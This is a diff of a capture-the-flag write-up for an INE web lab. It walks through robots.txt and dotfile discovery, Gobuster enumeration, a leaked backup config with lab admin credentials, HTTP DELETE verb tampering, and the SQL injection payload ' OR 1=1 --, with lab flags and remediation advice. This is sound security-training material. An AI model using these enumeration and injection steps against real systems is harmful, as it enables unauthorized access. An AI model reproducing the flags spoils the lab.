@@ -17,7 +17,7 @@ The assessment follows a structured five-task progression:
 - **Task 1 (Flag 1):** Discover well-known reconnaissance files (`robots.txt`), locate sensitive directories (`/secret-docs/`), and uncover hidden dotfiles (`.flag1.txt`).
 - **Task 2 (Flag 2):** Perform web directory discovery and unearth unreferenced backup configuration files (`/backup/app-config.bak`) exposing database parameters, administrative credentials, and Flag 2.
 - **Task 3 (Flag 3):** Authenticate to the administrative dashboard (`/admin/login.php`) using recovered credentials and inspect raw HTTP response headers (`X-Admin-Flag`) on `/admin/dashboard.php` to extract Flag 3 and identify internal API endpoints.
-- **Task 4 (Flag 4):** Interrogate the internal REST API endpoint (`/api/data`), test supported HTTP verbs, interpret developer hints regarding resource deletion, and execute an HTTP `DELETE` request to obtain Flag 4.
+- **Task 4 (Flag 4):** Interrogate the internal REST API endpoint (`/api/data`), determine supported HTTP methods using `OPTIONS`, interpret developer hints regarding resource deletion, and execute an HTTP `DELETE` request to obtain Flag 4.
 - **Task 5 (Flag 5):** Exploit an SQL injection vulnerability in the administrative database search feature (`/admin/search.php`) using a classic boolean bypass payload (`' OR 1=1 --`) to retrieve restricted hidden records from SQLite, revealing Flag 5.
 
 ![Lab Overview Completed](./images/lab_overview.jpg)
@@ -26,9 +26,10 @@ The assessment follows a structured five-task progression:
 
 ## 🛠️ Tools Used
 
-- **cURL (`v8.x`)** — HTTP client for probing headers, issuing custom HTTP methods (`DELETE`, `POST`), and querying configuration endpoints.
+- **cURL (`v8.x`)** — HTTP client for probing headers, issuing custom HTTP methods (`OPTIONS`, `DELETE`, `POST`), and querying configuration endpoints.
+- **Gobuster (`v3.6`)** — Fast web content directory and file extension enumeration tool.
 - **Firefox Web Browser & DevTools** — Manual browsing, UI navigation, and Network tab HTTP response header analysis.
-- **Dirb / Gobuster / Ffuf** — Web directory and file extension brute-forcing.
+- **SecLists / Dirb Wordlists** — `/usr/share/wordlists/dirb/common.txt` for directory discovery.
 - **SQLite / SQL Injection Techniques** — Tautology-based SQL injection payloads (`' OR 1=1 --`) for bypassing search query filters.
 
 ---
@@ -59,12 +60,23 @@ Navigating to `http://target.ine.local/` reveals **SecureBlog (`v2.3.1-beta`)**,
 ### Step 1.2: Inspecting `robots.txt`
 In web reconnaissance, `robots.txt` is an essential first check to find endpoints intended to be hidden from search engine crawlers:
 
-```
-http://target.ine.local/robots.txt
+```bash
+curl -i http://target.ine.local/robots.txt
 ```
 
-The file reveals three disallowed entries:
-```text
+**Output:**
+```http
+HTTP/1.1 200 OK
+Date: Mon, 23 Nov 2026 06:08:12 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.1.0-Ubuntu
+Last-Modified: Mon, 10 Aug 2026 11:35:33 GMT
+ETag: "52-658afc0892b40"
+Accept-Ranges: bytes
+Content-Length: 82
+Vary: Accept-Encoding
+Content-Type: text/plain
+
 User-agent: *
 Disallow: /admin/
 Disallow: /secret-docs/
@@ -73,19 +85,67 @@ Disallow: /api/internal/
 
 ![Robots.txt Reconnaissance](./images/flag1_robots_txt.png)
 
-### Step 1.3: Directory Listing & Dotfile Enumeration
-Navigating to `http://target.ine.local/secret-docs/` reveals that Apache directory listing (indexing) is enabled on the server:
+The file explicitly reveals three sensitive paths:
+- `/admin/` — Administrative interface
+- `/secret-docs/` — Restricted documentation directory
+- `/api/internal/` — Internal API endpoint
+
+### Step 1.3: Directory Listing & Hidden Dotfile Discovery
+We examine `/secret-docs/` to inspect its contents:
+
+```bash
+curl -i http://target.ine.local/secret-docs/
+```
+
+**Output:**
+```html
+HTTP/1.1 200 OK
+Date: Mon, 23 Nov 2026 06:10:04 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.1.0-Ubuntu
+Vary: Accept-Encoding
+Content-Length: 755
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /secret-docs</title>
+ </head>
+ <body>
+<h1>Index of /secret-docs</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.65 (Debian) Server at target.ine.local Port 80</address>
+</body></html>
+```
 
 ![Index of Secret Docs](./images/flag1_secret_docs_listing.png)
 
-Although the visible index only shows `Parent Directory`, UNIX systems conventionally hide files beginning with a dot (`.`). Checking for common hidden flag and configuration files directly:
+Apache directory listing (indexing) is enabled. While only `Parent Directory` is listed in the HTML table, UNIX files starting with a dot (`.`) are hidden from standard directory listings. 
 
-```
-http://target.ine.local/secret-docs/.flag1.txt
+Checking directly for hidden dotfiles:
+
+```bash
+curl -i http://target.ine.local/secret-docs/.flag1.txt
 ```
 
-The server responds with the contents of the hidden file:
-```text
+**Output:**
+```http
+HTTP/1.1 200 OK
+Date: Mon, 23 Nov 2026 06:11:24 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.1.0-Ubuntu
+Last-Modified: Mon, 23 Nov 2026 06:04:16 GMT
+ETag: "27-660eb5d1de09a"
+Accept-Ranges: bytes
+Content-Length: 39
+Content-Type: text/plain
+
 FLAG1_68aa0d6fd19044c2b0f25fa99f9c951d
 ```
 
@@ -97,56 +157,147 @@ FLAG1_68aa0d6fd19044c2b0f25fa99f9c951d
 
 ## 📂 2. Task 2: Unreferenced Backup Configuration Leakage (Flag 2)
 
-### Step 2.1: Web Directory Discovery
-Web directory enumeration (using wordlists with common backup extensions such as `.bak`, `.old`, `.save`) uncovers an unreferenced `/backup/` directory hosting `app-config.bak`.
+### Step 2.1: Web Directory Discovery with Gobuster
+We perform directory and file brute-forcing with Gobuster using common file extensions (`php`, `txt`, `bak`, `old`):
 
-### Step 2.2: Extracting Configuration and Credentials via cURL
-We fetch the backup file using `curl`:
+```bash
+gobuster dir -u http://target.ine.local/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old
+```
+
+**Gobuster Output:**
+```
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://target.ine.local/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              old,php,txt,bak
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 281]
+/.hta.php             (Status: 403) [Size: 281]
+/.hta.txt             (Status: 403) [Size: 281]
+/.htaccess            (Status: 403) [Size: 281]
+/.hta.old             (Status: 403) [Size: 281]
+/.htaccess.php        (Status: 403) [Size: 281]
+/.hta.bak             (Status: 403) [Size: 281]
+/.htaccess.txt        (Status: 403) [Size: 281]
+/.htaccess.bak        (Status: 403) [Size: 281]
+/.htaccess.old        (Status: 403) [Size: 281]
+/.htpasswd            (Status: 403) [Size: 281]
+/.htpasswd.bak        (Status: 403) [Size: 281]
+/.htpasswd.php        (Status: 403) [Size: 281]
+/.htpasswd.old        (Status: 403) [Size: 281]
+/.htpasswd.txt        (Status: 403) [Size: 281]
+/admin                (Status: 301) [Size: 320] [--> http://target.ine.local/admin/]
+/api                  (Status: 301) [Size: 318] [--> http://target.ine.local/api/]
+/backup               (Status: 301) [Size: 321] [--> http://target.ine.local/backup/]
+/css                  (Status: 301) [Size: 318] [--> http://target.ine.local/css/]
+/error.php            (Status: 200) [Size: 659]
+/index.php            (Status: 200) [Size: 1796]
+/index.php            (Status: 200) [Size: 1796]
+/posts.php            (Status: 200) [Size: 1471]
+/robots.txt           (Status: 200) [Size: 82]
+/robots.txt           (Status: 200) [Size: 82]
+/server-status        (Status: 403) [Size: 281]
+Progress: 23070 / 23075 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+Gobuster discovers an unreferenced `/backup` directory redirecting with HTTP 301.
+
+### Step 2.2: Enumerating the Backup Directory
+We query `/backup/` to inspect its directory contents:
+
+```bash
+curl -i http://target.ine.local/backup/
+```
+
+**Output:**
+```html
+HTTP/1.1 200 OK
+Date: Mon, 23 Nov 2026 06:15:31 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.1.0-Ubuntu
+Vary: Accept-Encoding
+Content-Length: 954
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /backup</title>
+ </head>
+ <body>
+<h1>Index of /backup</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="app-config.bak">app-config.bak</a></td><td align="right">2026-11-23 06:04  </td><td align="right">540 </td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.65 (Debian) Server at target.ine.local Port 80</address>
+</body></html>
+```
+
+The directory hosts `app-config.bak` (540 bytes).
+
+### Step 2.3: Extracting Credentials & Flag 2 via cURL
+Fetching `app-config.bak`:
 
 ```bash
 curl -i http://target.ine.local/backup/app-config.bak
 ```
 
-**Response Output:**
+**Output:**
 ```ini
 HTTP/1.1 200 OK
-Date: Mon, 23 Nov 2026 06:18:10 GMT
+Date: Mon, 23 Nov 2026 06:16:49 GMT
 Server: Apache/2.4.65 (Debian)
-Last-Modified: Fri, 15 Mar 2024 10:22:15 GMT
-ETag: "1b4-613b5e4a2c100"
+X-Powered-By: PHP/8.1.0-Ubuntu
+Last-Modified: Mon, 23 Nov 2026 06:04:18 GMT
+ETag: "21c-660eb5d3c8096"
 Accept-Ranges: bytes
-Content-Length: 436
-Content-Type: text/plain
+Content-Length: 540
+Content-Type: application/x-trash
 
-# ========================================================
+# ==========================================
 # SecureBlog Application Configuration
 # Environment: STAGING
-# Last Modified: 2024-03-15
-# ========================================================
+# Last updated: 2024-01-15
+# ==========================================
 
-[database]
-db_type = sqlite
-db_path = /var/www/html/database/blog.db
-
-[admin]
-admin_url = /admin/login.php
-admin_user = admin
-admin_pass = s3cur3_p@ss!
+[admin_panel]
+admin_url   = /admin/login.php
+admin_user  = admin
+admin_pass  = s3cur3_p@ss!
 
 [flags]
-; OWASP A05:2021 Security Misconfiguration
-; WSTG-CONF-04 Review Old Backup and Unreferenced Files
-flag2 = FLAG2_eb4d4ea2b05d470b9c47402834cc7e49
+flag2       = FLAG2_eb4d4ea2b05d470b9c47402834cc7e49
+
+# WARNING: This file should NOT be on the production server!
+# It contains plaintext credentials.
+# OWASP A05:2021 — Security Misconfiguration
+# WSTG-CONF-04 — Review Old Backup and Unreferenced Files
 ```
 
 ![Backup Config Leak](./images/flag2_backup_config_leak.jpg)
 
 ![Backup Config Admin Credentials](./images/backup_config_admin_creds.png)
 
-The leaked configuration provides:
-- **Database Engine & Path:** SQLite at `/var/www/html/database/blog.db`
+The leaked configuration exposes:
 - **Admin Login Endpoint:** `/admin/login.php`
-- **Admin Credentials:** `admin` / `s3cur3_p@ss!`
+- **Administrative Credentials:** `admin` : `s3cur3_p@ss!`
 - **Flag 2:** `FLAG2_eb4d4ea2b05d470b9c47402834cc7e49`
 - **Vulnerability Mapping:** OWASP A05:2021 (Security Misconfiguration) & OWASP WSTG-CONF-04 (Review Old, Backup and Unreferenced Files).
 
@@ -157,7 +308,7 @@ The leaked configuration provides:
 ## 🔑 3. Task 3: Administrative Authentication & Response Header Analysis (Flag 3)
 
 ### Step 3.1: Authenticating to the Admin Portal
-Using the credentials harvested from Task 2 (`admin` : `s3cur3_p@ss!`), we browse to the admin login page:
+Using the credentials harvested from `app-config.bak` (`admin` : `s3cur3_p@ss!`), we browse to the admin login page:
 ```
 http://target.ine.local/admin/login.php
 ```
@@ -200,6 +351,7 @@ The server leaks sensitive debug information in custom headers:
 - `X-Admin-Flag`: Contains the Flag 3 token.
 - `X-Internal-API`: Points to an internal API endpoint at `/api/data`.
 - `X-Debug-Mode`: Enabled.
+- `X-Backend-Server`: `apache-node-01.internal`.
 
 ✅ **Flag 3 Captured:** `FLAG3_b257cd2f80b748c89eb6e4f8a0eca5f3`
 
@@ -207,10 +359,34 @@ The server leaks sensitive debug information in custom headers:
 
 ## ⚡ 4. Task 4: Internal REST API & HTTP Method Tampering (Flag 4)
 
-### Step 4.1: Probing the Leaked API Endpoint
-With the internal API endpoint disclosed as `/api/data`, we test standard HTTP methods using `curl`.
+### Step 4.1: Identifying Supported HTTP Methods via `OPTIONS`
+With the internal API endpoint disclosed as `/api/data`, we first query the endpoint using the HTTP `OPTIONS` method to discover which verbs are supported:
 
-#### Probing with POST:
+```bash
+curl -i -X OPTIONS http://target.ine.local/api/data
+```
+
+**Output:**
+```http
+HTTP/1.1 200 OK
+Date: Mon, 23 Nov 2026 06:21:47 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.1.0-Ubuntu
+X-Powered-By: PHP/8.1.34
+Allow: GET, POST, DELETE, OPTIONS
+Content-Length: 53
+Content-Type: application/json
+
+{"allowed_methods":["GET","POST","DELETE","OPTIONS"]}
+```
+
+The `Allow` response header and JSON payload confirm four permitted methods:
+`GET`, `POST`, `DELETE`, `OPTIONS`.
+
+### Step 4.2: Testing Methods & Interpreting Hints
+Next, we test `POST` and `GET`:
+
+#### Testing POST:
 ```bash
 curl -i -X POST http://target.ine.local/api/data
 ```
@@ -228,7 +404,9 @@ Content-Type: application/json
 {"message":"POST received. No flag here.","hint":"Try a different method - one that removes resources."}
 ```
 
-#### Probing with GET:
+The response includes a hint: *"Try a different method - one that removes resources."*
+
+#### Testing GET:
 ```bash
 curl -i http://target.ine.local/api/data
 ```
@@ -246,10 +424,8 @@ Content-Type: application/json
 {"message":"SecureBlog Internal API v1.0","endpoints":["/api/data"]}
 ```
 
-### Step 4.2: Exploiting HTTP `DELETE` Method
-The developer's hint explicitly directs us: *"Try a different method - one that removes resources."* In RESTful architectures, the method designated for deleting resources is `DELETE`.
-
-Sending an HTTP `DELETE` request:
+### Step 4.3: Exploiting HTTP `DELETE` Method (Flag 4)
+In REST architectures, the method designated for removing resources is `DELETE`. We execute a `DELETE` request:
 
 ```bash
 curl -i -X DELETE http://target.ine.local/api/data
@@ -270,8 +446,6 @@ Content-Type: application/json
 
 ![API DELETE Method Exploit](./images/flag4_api_delete_method.jpg)
 
-The API validates the `DELETE` verb and returns Flag 4.
-
 ✅ **Flag 4 Captured:** `FLAG4_701b31543c9c47b3b43923d946431e19`
 
 ---
@@ -284,7 +458,7 @@ In the Admin Dashboard, the navigation bar and quick links include a **Search DB
 http://target.ine.local/admin/search.php
 ```
 
-This page allows administrators to search blog post records by title or content. Under normal usage, standard queries only display public posts (e.g., IDs 1, 2, and 3).
+This page allows administrators to search blog post records by title or content. Under normal usage, standard queries only display public posts (IDs 1, 2, and 3).
 
 ### Step 5.2: SQL Injection Boolean Bypass
 The search query parameter `q` is directly concatenated into the backend SQLite query without parameterization or input sanitization:
@@ -329,7 +503,7 @@ Hidden post ID `100` created by `system` contains Flag 5.
 | **Task 1** | Well-known reconnaissance file exposed at web root | Information Disclosure (`robots.txt`) & Hidden Dotfile | `/secret-docs/.flag1.txt` | `FLAG1_68aa0d6fd19044c2b0f25fa99f9c951d` |
 | **Task 2** | Hidden directories through brute-forcing | Unreferenced Backup File Exposure (OWASP A05 / WSTG-CONF-04) | `/backup/app-config.bak` | `FLAG2_eb4d4ea2b05d470b9c47402834cc7e49` |
 | **Task 3** | Authenticate & inspect HTTP response | Sensitive HTTP Response Header Disclosure | `GET /admin/dashboard.php` (`X-Admin-Flag`) | `FLAG3_b257cd2f80b748c89eb6e4f8a0eca5f3` |
-| **Task 4** | Identify HTTP methods supported by internal API | Insecure Direct Object / Verb Tampering (`DELETE`) | `DELETE /api/data` | `FLAG4_701b31543c9c47b3b43923d946431e19` |
+| **Task 4** | Identify HTTP methods supported by internal API | Insecure Direct Object / Verb Tampering (`OPTIONS` & `DELETE`) | `OPTIONS` & `DELETE /api/data` | `FLAG4_701b31543c9c47b3b43923d946431e19` |
 | **Task 5** | Exploit admin search to reveal hidden record | SQLite SQL Injection (Boolean / Tautology Bypass `' OR 1=1 --`) | `/admin/search.php?q='+OR+1%3D1+--` | `FLAG5_eadaa8ac95e442cba56bb89e11e8f4a2` |
 
 ---
@@ -350,6 +524,7 @@ Hidden post ID `100` created by `system` contains Flag 5.
 
 4. **HTTP Verb / Method Handling:**
    - RESTful endpoints often respond differently depending on the HTTP method (`GET`, `POST`, `PUT`, `DELETE`, `OPTIONS`).
+   - Using the `OPTIONS` method is an RFC-standard way to discover permitted verbs.
    - Restrict administrative or destructive HTTP methods using proper authorization middleware and web server configuration.
 
 5. **Parameterized Queries Against SQL Injection:**
